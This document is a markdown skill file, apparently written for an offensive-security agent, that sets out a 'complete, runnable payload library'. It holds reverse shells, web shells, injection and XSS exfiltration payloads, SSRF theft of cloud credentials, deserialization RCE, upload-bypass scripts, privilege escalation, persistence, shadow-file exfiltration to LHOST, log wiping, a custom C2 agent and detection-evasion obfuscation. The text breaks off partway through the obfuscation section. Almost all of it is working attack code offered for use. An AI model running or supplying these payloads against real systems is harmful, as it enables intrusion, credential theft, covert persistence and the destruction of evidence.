---
description: "Elite payload library: reverse shells, web shells, SQL injection, XSS, SSRF, LFI/RFI, XXE, SSTI, deserialization, file upload bypass, WAF evasion, post-exploitation payloads, C2 integration, payload obfuscation, AV/EDR evasion, cloud-specific payloads, OOB/blind testing."
---

# SKILL — payload-craft

## Purpose
Complete, runnable payload library for every phase of an engagement. Every payload is ready to use with minimal modification. All commands are exact.

---

## Section 1 — Reverse Shells

### 1.1 Bash

```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9MSE9TVC9MUE9SVCAwPiYx}|{base64,-d}|bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f
bash -i >& /dev/udp/LHOST/LPORT 0>&1
exec 5<>/dev/tcp/LHOST/LPORT; cat <&5 | while read l; do $l 2>&5 >&5; done
```

### 1.2 Python

```bash
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3 PTY (fully interactive)
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# Windows Python
python3 -c "import socket,subprocess;s=socket.socket();s.connect(('LHOST',LPORT));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)"
```

### 1.3 PHP

```bash
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("LHOST",LPORT);$proc=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);'
```

### 1.4 PowerShell

```powershell
# Classic TCP shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {$c=New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()}}"

# Download + execute from memory (no disk)
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')"

# AMSI bypass + encoded shell
powershell "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')"
```

### 1.5 Netcat

```bash
nc -e /bin/sh LHOST LPORT               # with -e flag
nc -e cmd.exe LHOST LPORT               # Windows
ncat LHOST LPORT -e /bin/bash           # ncat
busybox nc LHOST LPORT -e /bin/sh       # busybox
```

### 1.6 Others

```bash
# Perl
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Node.js
node -e 'var n=require("net"),s=n.connect(LPORT,"LHOST",function(){var e=require("child_process").spawn("/bin/sh");e.stdin.pipe(s);s.pipe(e.stdout);s.pipe(e.stderr)});'

# Go (cross-compile for any platform)
# GOOS=linux GOARCH=amd64 go build -o rev rev.go
# File: package main; import("net";"os/exec";"time"); func main(){for{c,_:=net.Dial("tcp","LHOST:LPORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();time.Sleep(1)}}

# Java (in JSP context)
# Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/LHOST/LPORT 0>&1"})
```

---

## Section 2 — Web Shells

### 2.1 PHP

```php
# Minimal
<?php system($_GET['c']); ?>

# Full-featured
<?php
if(isset($_REQUEST['cmd'])){
    $cmd=$_REQUEST['cmd'];
    if(function_exists('system')){ ob_start(); system($cmd); $o=ob_get_clean(); }
    elseif(function_exists('shell_exec')){ $o=shell_exec($cmd); }
    elseif(function_exists('exec')){ exec($cmd,$out); $o=implode("\n",$out); }
    elseif(function_exists('passthru')){ ob_start(); passthru($cmd); $o=ob_get_clean(); }
    else{ $o="No exec function available"; }
    echo '<pre>'.htmlspecialchars($o).'</pre>';
}
?>

# Obfuscated variants
<?php call_user_func(base64_decode('c3lzdGVt'), $_GET['c']); ?>
<?php @eval(base64_decode($_POST['c'])); ?>
<?php $f='sys'.'tem'; $f($_GET['c']); ?>

# GIF89a polyglot (valid GIF header + PHP payload)
# python3 -c "open('shell.php','wb').write(b'GIF89a\n<?php system(\$_GET[\"c\"]); ?>')"

# .htaccess trick (upload alongside .jpg shell)
# AddType application/x-httpd-php .jpg
```

### 2.2 JSP

```jsp
<%@ page import="java.io.*" %>
<% String cmd=request.getParameter("cmd"); if(cmd!=null){ Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd}); InputStream is=p.getInputStream(); InputStreamReader isr=new InputStreamReader(is); BufferedReader br=new BufferedReader(isr); String l; StringBuilder sb=new StringBuilder(); while((l=br.readLine())!=null){sb.append(l).append("\n");} out.println("<pre>"+sb+"</pre>"); } %>
```

### 2.3 ASPX

```aspx
<%@ Page Language="C#" %>
<% if(Request["c"]!=null){var psi=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){UseShellExecute=false,RedirectStandardOutput=true,RedirectStandardError=true};var p=System.Diagnostics.Process.Start(psi);Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd()+"</pre>");} %>
```

---

## Section 3 — SQL Injection

### 3.1 Authentication Bypass

```sql
admin'--
' OR '1'='1'--
' OR 1=1--
') OR ('1'='1
admin'/*
' OR 1=1#
" OR "1"="1
```

### 3.2 MySQL UNION + Extraction

```sql
-- Find column count
1 ORDER BY 1-- (increment until error)
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--

-- Data extraction (adjust col count)
-1 UNION SELECT 1,CONCAT(user(),0x3a,database(),0x3a,@@version),3-- -
-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -

-- File read (requires FILE privilege)
-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -

-- File write (RCE via webshell drop)
-1 UNION SELECT 1,"<?php system($_GET['c']); ?>",3 INTO OUTFILE '/var/www/html/sh.php'-- -
```

### 3.3 Error-Based + Blind

```sql
-- Error-based MySQL
1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -

-- Time-based blind
1 AND SLEEP(5)-- -
1 AND IF(1=1,SLEEP(5),0)-- -
1'; WAITFOR DELAY '0:0:5'-- -    (MSSQL)

-- Boolean blind (binary search)
1 AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- -
```

### 3.4 MSSQL / PostgreSQL / Oracle

```sql
-- MSSQL xp_cmdshell RCE
1; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';-- -

-- PostgreSQL RCE via COPY
1; CREATE TABLE cmd_exec(o text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT o FROM cmd_exec;-- -

-- PostgreSQL file read
1 UNION SELECT pg_read_file('/etc/passwd',0,100000)-- -

-- Oracle UNION (needs FROM DUAL)
1 UNION SELECT NULL FROM DUAL--
1 UNION SELECT banner FROM v$version--

-- Oracle OOB via UTL_HTTP
1 UNION SELECT UTL_HTTP.REQUEST('http://LHOST/'||user) FROM DUAL--
```

---

## Section 4 — XSS Payloads

### 4.1 Detection

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=1 onerror=alert(1)>
javascript:alert(1)
```

### 4.2 WAF Bypass

```html
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<svg><script>//<![CDATA[ alert(1)//]]></script></svg>
<scr<!---->ipt>alert(1)</scr<!---->ipt>
<img src="java\0script:alert(1)">
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
{{constructor.constructor('alert(1)')()}}   (Angular template injection)
```

### 4.3 Data Exfiltration

```javascript
// Cookie theft
<img src=x onerror="fetch('https://LHOST/c?d='+btoa(document.cookie))">

// Full page exfil
<script>fetch('https://LHOST/page',{method:'POST',body:btoa(document.documentElement.innerHTML)})</script>

// Keylogger
<script>document.addEventListener('keypress',e=>fetch('https://LHOST/k?k='+e.key))</script>

// XSS → CSRF (admin action via victim browser)
<script>fetch('/api/admin/create-user',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"username":"hacker","password":"Password1","role":"admin"}'})</script>

// Blind XSS — load remote script (for stored XSS with delayed execution)
<script src='https://LHOST/xss.js'></script>
// xss.js: fetch('https://LHOST/catch',{method:'POST',body:JSON.stringify({url:location.href,cookie:document.cookie,dom:btoa(document.body.innerHTML)})})

// SSRF probe from victim browser
<script>['http://192.168.1.1','http://10.0.0.1','http://127.0.0.1:8080'].forEach(ip=>{var x=new XMLHttpRequest();x.timeout=1000;x.onload=()=>fetch('https://LHOST/p?ip='+ip+'&s='+x.status);x.open('GET',ip,true);x.send()})</script>
```

---

## Section 5 — SSRF Payloads

### 5.1 Probe Targets

```
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0177.0.0.1/      (octal 127.0.0.1)
http://2130706433/      (decimal 127.0.0.1)
http://0x7f000001/      (hex 127.0.0.1)

# Internal services
http://127.0.0.1:22/    http://127.0.0.1:3306/  http://127.0.0.1:5432/
http://127.0.0.1:6379/  http://127.0.0.1:27017/ http://127.0.0.1:9200/
http://127.0.0.1:2375/  http://127.0.0.1:10250/ http://127.0.0.1:2379/
```

### 5.2 Cloud Metadata

```
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data

# GCP (requires header Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (requires header Metadata: true)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### 5.3 Protocol Smuggling

```
# Gopher → Redis RCE (SET authorized_keys or eval)
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2458%0D%0A%0A%0A*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/LHOST/LPORT%200>&1%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

# dict:// (Redis info)
dict://127.0.0.1:6379/info

# file:// (local file read via SSRF)
file:///etc/passwd
file:///C:/Windows/win.ini

# URL parser bypass
http://evil.com@127.0.0.1/
http://127.0.0.1#evil.com
http://127.0.0.1.nip.io/
```

---

## Section 6 — LFI / Path Traversal

### 6.1 Traversal Sequences

```
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
/etc/passwd%00
/etc/passwd%00.jpg
```

### 6.2 Key Files

```
Linux:  /etc/passwd  /etc/shadow  /etc/crontab  /root/.ssh/id_rsa
        /proc/self/environ  /proc/self/cmdline  /proc/net/tcp
        /var/log/apache2/access.log  /var/log/nginx/access.log
        /home/USER/.bash_history  /home/USER/.ssh/id_rsa

Windows: C:\Windows\win.ini  C:\inetpub\wwwroot\web.config
         C:\Users\Administrator\Desktop\flag.txt
         C:\xampp\htdocs\config.php
```

### 6.3 LFI → RCE

```bash
# Log poisoning (Apache)
curl -sk "https://target.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
curl -sk "https://target.com/?page=/var/log/apache2/access.log&cmd=id"

# PHP filter (base64 read without code exec)
curl -sk "https://target.com/?page=php://filter/convert.base64-encode/resource=/etc/passwd" | \
  grep -oP '[A-Za-z0-9+/=]{50,}' | base64 -d

# PHP filter chain RCE (no file write needed)
# Generate: python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
# Result: php://filter/convert.iconv.../resource=php://temp
# Use as page= parameter value

# PHP input (POST body as code)
curl -sk "https://target.com/?page=php://input" -X POST -d '<?php system("id"); ?>'
```

---

## Section 7 — XXE Payloads

```xml
<!-- Classic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>

<!-- Blind OOB — reference DTD on attacker server -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://LHOST/evil.dtd"> %xxe;]>
<data>&exfil;</data>
```

```xml
<!-- evil.dtd on LHOST (served via python3 -m http.server 80): -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY exfil SYSTEM 'http://LHOST/?d=%file;'>">
%payload;
```

```xml
<!-- SVG XXE (for file upload bypass) -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

---

## Section 8 — SSTI Payloads

```
Detection (try all input points):
{{7*7}}          → Jinja2/Twig → 49
${7*7}           → FreeMarker → 49
<%= 7*7 %>       → ERB → 49
*{7*7}           → Thymeleaf → 49
{{7*'7'}}        → Jinja2 → 7777777  (vs Twig → 49)

=== JINJA2 (Python/Flask) ===
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Reverse shell:
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"').read()}}

=== FREEMARKER (Java) ===
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

=== GROOVY (Jenkins) ===
${"id".execute().text}
${['bash','-c','id'].execute().text}

=== TWIG (PHP) ===
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

=== ERB (Ruby) ===
<%= `id` %>
<%= system("id") %>

=== VELOCITY (Java) ===
#set($r=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$r.waitFor()
#set($o=$r.getInputStream())
#foreach($i in [1..$o.available()])$class.inspect("java.lang.Character").type.toChars($o.read())[0]#end
```

---

## Section 9 — Deserialization Payloads

### 9.1 Java — ysoserial

```bash
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Test all gadget chains
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 \
             CommonsCollections5 CommonsCollections6 CommonsCollections7 \
             Spring1 Spring2 Groovy1 BeanShell1 ROME JRMPClient CommonsBeanutils1 Jdk7u21; do
  java -jar ysoserial-all.jar $chain "curl http://LHOST/${chain}" 2>/dev/null \
    > /tmp/deser_${chain}.bin && echo "[*] ${chain}: $(wc -c < /tmp/deser_${chain}.bin)b"
done

# Base64 for HTTP body
java -jar ysoserial-all.jar CommonsCollections1 "curl http://LHOST:8080/cc1" 2>/dev/null | base64 -w0

# Send via curl
curl -X POST https://target.com/api/deserialize \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @/tmp/deser_CommonsCollections1.bin
```

### 9.2 PHP Deserialization

```bash
# phpggc — known PHP gadget chains
phpggc Laravel/RCE1 system id
phpggc Laravel/RCE4 system "bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'" --base64
phpggc Symfony/RCE4 system id
phpggc Drupal/RCE1 system id
phpggc WordPress/RCE1 system id
phpggc Monolog/RCE1 system id --base64
phpggc Yii/RCE1 system id
```

```php
<?php
// Manual gadget — adapt to target app's class structure
class GadgetChain {
    public $cmd;
    public function __destruct() { system($this->cmd); }
}
$obj = new GadgetChain();
$obj->cmd = "bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'";
echo base64_encode(serialize($obj)) . "\n";
?>
```

### 9.3 Python Pickle RCE

```python
#!/usr/bin/env python3
import pickle, os, base64, sys

class RCE:
    def __init__(self, cmd): self.cmd = cmd
    def __reduce__(self): return (os.system, (self.cmd,))

class RevShell:
    def __init__(self, lhost, lport): self.lhost = lhost; self.lport = lport
    def __reduce__(self):
        cmd = f"bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"
        return (os.system, (cmd,))

cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
if sys.argv[1].count('.') == 3 and len(sys.argv) > 2:
    payload = pickle.dumps(RevShell(sys.argv[1], int(sys.argv[2])))
else:
    payload = pickle.dumps(RCE(cmd))

print("Base64:", base64.b64encode(payload).decode())
```

### 9.4 .NET — ysoserial.net

```powershell
# BinaryFormatter (legacy .NET apps)
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "cmd /c whoami > C:\Temp\pwn.txt"

# Json.Net (ASP.NET APIs — very common)
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "cmd /c whoami"

# XmlSerializer
ysoserial.exe -f XmlSerializer -g ObjectDataProvider -o raw -c "cmd /c whoami"

# ViewState (no validation key required for legacy)
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami > C:\Temp\pwn.txt" --generator=CA0B0334 --viewstateuserkey=invalid --islegacy

# ViewState (when machineKey/validationKey known from web.config)
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --generator=CA0B0334 --validationalg=SHA1 --validationkey=FOUND_VALIDATION_KEY
```

### 9.5 Node.js / Ruby

```javascript
// node-serialize CVE-2017-5941 — send as cookie/JSON
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/LHOST/LPORT 0>&1\"')}()"}
```

```ruby
# Ruby Marshal — RCE via deserialization
# ruby -e 'require "base64"; class Exploit; def marshal_dump; end; def marshal_load(x); `id`; end; end; puts Base64.encode64(Marshal.dump(Exploit.new))'
```

---

## Section 10 — File Upload Bypass

### 10.1 Extension Bypass Ladder

```
PHP:   .php5 .php7 .php8 .phtml .phar .phps .pHp .PHP .php.jpg (with .htaccess)
ASP:   .asp; (IIS null byte) .asa .ashx .aspx
JSP:   .jspx .jsw .jsv .jspf
Double extension: shell.jpg.php  shell.php.jpg  shell.php%00.jpg (old PHP)
```

### 10.2 MIME / Content-Type Bypass

```python
#!/usr/bin/env python3
"""Upload bypass tester"""
import requests, urllib3, io
urllib3.disable_warnings()

TARGET = "https://target.com/upload"
SHELL = b"<?php system($_GET['cmd']); ?>"

MAGIC = {
    "gif89a": b"GIF89a",
    "jpeg":   b"\xff\xd8\xff\xe0\x00\x10JFIF",
    "png":    b"\x89PNG\r\n\x1a\n",
}

s = requests.Session()
s.verify = False

tests = [
    ("shell.php",       SHELL,               "application/x-php"),
    ("shell.php",       SHELL,               "image/jpeg"),
    ("shell.php5",      SHELL,               "image/jpeg"),
    ("shell.phtml",     SHELL,               "image/gif"),
    ("shell.php.jpg",   SHELL,               "image/jpeg"),
    ("polyglot.php",    MAGIC["gif89a"]+b"\n"+SHELL, "image/gif"),
    ("polyglot.php",    MAGIC["jpeg"]+SHELL, "image/jpeg"),
    ("shell.jpg.php",   SHELL,               "image/jpeg"),
]

for fname, content, ctype in tests:
    r = s.post(TARGET, files={'file': (fname, io.BytesIO(content), ctype)})
    print(f"[{r.status_code}] {fname} ({ctype})")
    import re
    for m in re.finditer(r'(?:href|src)=["\']([^"\']*\.php[^"\']*)["\']', r.text):
        print(f"  [+] Shell at: {m.group(1)}")
```

### 10.3 ZIP Slip

```python
#!/usr/bin/env python3
"""ZIP slip — path traversal via archive to drop webshell"""
import zipfile, tarfile, io, sys

SHELL = b"<?php system($_GET['cmd']); ?>"
SHELL_PATH = sys.argv[1] if len(sys.argv) > 1 else "../../var/www/html/shell.php"
OUTZIP = "/tmp/zipslip.zip"
OUTTGZ = "/tmp/zipslip.tar.gz"

with zipfile.ZipFile(OUTZIP, 'w') as zf:
    zf.writestr(SHELL_PATH, SHELL.decode())
    zf.writestr("normal_file.jpg", "DECOY")

with tarfile.open(OUTTGZ, 'w:gz') as tf:
    info = tarfile.TarInfo(name=SHELL_PATH)
    info.size = len(SHELL)
    tf.addfile(info, io.BytesIO(SHELL))

print(f"ZIP:  {OUTZIP}")
print(f"TGZ:  {OUTTGZ}")
print(f"Path: {SHELL_PATH}")
```

---

## Section 11 — Post-Exploitation

### 11.1 Linux Privilege Escalation

```bash
# SUID binaries
find / -perm -u=s -type f 2>/dev/null
/usr/bin/find -exec /bin/sh -p \; -quit
/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# sudo abuse
sudo -l
sudo vim -c ':py3 import os; os.execl("/bin/bash","bash","-p")'
sudo find . -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo env /bin/bash
sudo awk 'BEGIN {system("/bin/bash")}'

# Cron job abuse
cat /etc/crontab; ls -la /etc/cron.*
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /path/to/writable_cron_script.sh

# Capabilities
getcap -r / 2>/dev/null
# cap_setuid → python3 -c 'import ctypes; ctypes.CDLL(None).setuid(0); import os; os.system("/bin/bash")'

# Docker socket escape
curl --unix-socket /var/run/docker.sock http://d/containers/json && \
  docker run -v /:/host -it alpine chroot /host /bin/bash

# Writable PATH hijack
echo '/bin/bash -p' > /tmp/ls && chmod +x /tmp/ls && export PATH=/tmp:$PATH
# Then trigger root script that calls 'ls'

# LinPEAS / LES
curl -sk https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
curl -sk https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash
```

### 11.2 Windows Privilege Escalation

```powershell
# Info gathering
whoami /all
net user %username%
systeminfo
wmic qfe list brief

# SeImpersonatePrivilege (most common on service accounts)
whoami /priv | findstr "Impersonate"
.\PrintSpoofer64.exe -i -c cmd
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c net user hacker Password1! /add && net localgroup administrators hacker /add"

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
# Both = 1: msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f msi > evil.msi && msiexec /quiet /i evil.msi

# Unquoted service paths
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v '"'

# WinPEAS
.\winPEAS.exe quiet > C:\Temp\winpeas.txt
```

### 11.3 Persistence

```bash
# Linux
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1") | crontab -
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1 &' >> ~/.bashrc
mkdir -p ~/.ssh; echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys
```

```powershell
# Windows
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
schtasks /create /sc minute /mo 5 /tn "HealthMonitor" /tr "C:\Windows\Temp\shell.exe" /ru SYSTEM /f
```

### 11.4 Exfiltration

```bash
# DNS
cat /etc/passwd | xxd -p | fold -w 50 | while read c; do nslookup "${c}.LHOST" >/dev/null 2>&1; done

# HTTP
curl -sk -X POST "https://LHOST/e" -d "d=$(cat /etc/shadow | base64 -w0)"
tar czf - /home/user/Documents 2>/dev/null | curl -sk -X POST "https://LHOST/e" --data-binary @-

# Log cleanup
export HISTFILE=/dev/null; cat /dev/null > ~/.bash_history; history -c
find /var/log -name "*.log" -exec truncate -s 0 {} \; 2>/dev/null
```

---

## Section 12 — Shell Upgrades and C2

### 12.1 Dumb Shell → Full TTY

```bash
# Method 1: Python (most common)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then: stty raw -echo; fg
# Then: export TERM=xterm; stty rows 50 columns 200

# Method 2: Script
script /dev/null -c bash
# Ctrl+Z, then: stty raw -echo; fg

# Method 3: socat (best quality)
# Attacker: socat file:`tty`,raw,echo=0 tcp-listen:LPORT
# Victim:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT

# Method 4: SSH (when SSH is available)
# Victim: echo "YOUR_SSH_PUBKEY" >> ~/.ssh/authorized_keys
# Attacker: ssh -i ~/.ssh/id_rsa user@TARGET
```

### 12.2 C2 Frameworks

```bash
# Sliver C2 (modern, cross-platform)
curl https://sliver.sh/install | sudo bash
sudo sliver-server

# In Sliver console:
generate --mtls LHOST --os linux --arch amd64 --save /tmp/implant
generate --https LHOST --os windows --arch amd64 --format exe --save /tmp/implant.exe
mtls --lport 8888
https --lport 443
# After connect: use SESSION; shell; execute -s -- id; download /etc/shadow; socks5 start --port 1080

# Havoc C2
# Build: https://github.com/HavocFramework/Havoc
# havoc server --profile ./profiles/havoc.yaotl
# Listener: HTTPS on 443; demon payload for Windows

# Metasploit handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT LPORT; set ExitOnSession false; run -j"
```

### 12.3 Custom Python C2

```python
#!/usr/bin/env python3
"""
Minimal Python HTTPS-blend C2
Server: python3 c2.py server [port]
Agent:  python3 c2.py agent LHOST LPORT
"""
import socket, subprocess, threading, time, sys, os

def server(port=4444):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', port))
    srv.listen(5)
    print(f"[*] Listening on 0.0.0.0:{port}")

    def handle(conn, addr):
        print(f"[+] Agent: {addr}")
        while True:
            try:
                cmd = input(f"shell@{addr[0]}> ")
                if not cmd: continue
                if cmd in ('exit','quit'): conn.send(b"__EXIT__\n"); break
                conn.send(cmd.encode()+b"\n")
                out = b""
                while True:
                    chunk = conn.recv(8192)
                    out += chunk
                    if b"__END__" in out: break
                    if len(chunk) < 8192: break
                print(out.replace(b"__END__",b"").decode('utf-8','replace'))
            except: break
        conn.close()

    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle, args=(conn,addr), daemon=True).start()

def agent(host, port):
    while True:
        try:
            s = socket.socket()
            s.connect((host, int(port)))
            while True:
                cmd = s.recv(4096).decode('utf-8','replace').strip()
                if cmd == "__EXIT__": break
                if not cmd: continue
                try:
                    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                    out = r.stdout + r.stderr
                except Exception as e: out = str(e)
                s.send((out+"__END__").encode())
            s.close()
        except: pass
        time.sleep(30)

if __name__ == "__main__":
    if len(sys.argv) < 2: print(f"Usage: {sys.argv[0]} server [port] | agent LHOST LPORT"); sys.exit(1)
    if sys.argv[1] == "server": server(int(sys.argv[2]) if len(sys.argv)>2 else 4444)
    else: agent(sys.argv[2], sys.argv[3])
```

---

## Section 13 — Payload Obfuscation

### 13.1 Bash Obfuscation

```bash
# Hex encoding
$'\x62\x61\x73\x68' -i >& /dev/tcp/LHOST/LPORT 0>&1

# Variable splitting
C='bas'; D='h'; $C$D -i >& /dev/tcp/LHOST/LPORT 0>&1

# Base64 eval chain
echo "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" | base64 | \
  xargs -I{} bash -c '{echo,{}}|{base64,-d}|bash'

# IFS trick
IFS=_; CMD=bash_-i_>&_/dev/tcp/LHOST/LPORT_0>&1; $CMD

# Octal encoding
echo -e '\142\141\163\150' -i \>\& /dev/tcp/LHOST/LPORT 0\>\&1 | bash
```

### 13.2 Python Obfuscation

```python
import base64, marshal, zlib

# Layer 1: base64 exec
code = "import os; os.system('id')"
b64 = base64.b64encode(code.encode()).decode()
print(f"exec(compile(base64.b64decode(b'{b64}'),'<s>','exec'))")

# Layer 2: marshal + zlib + b64
code = "import os; os.system('id')"
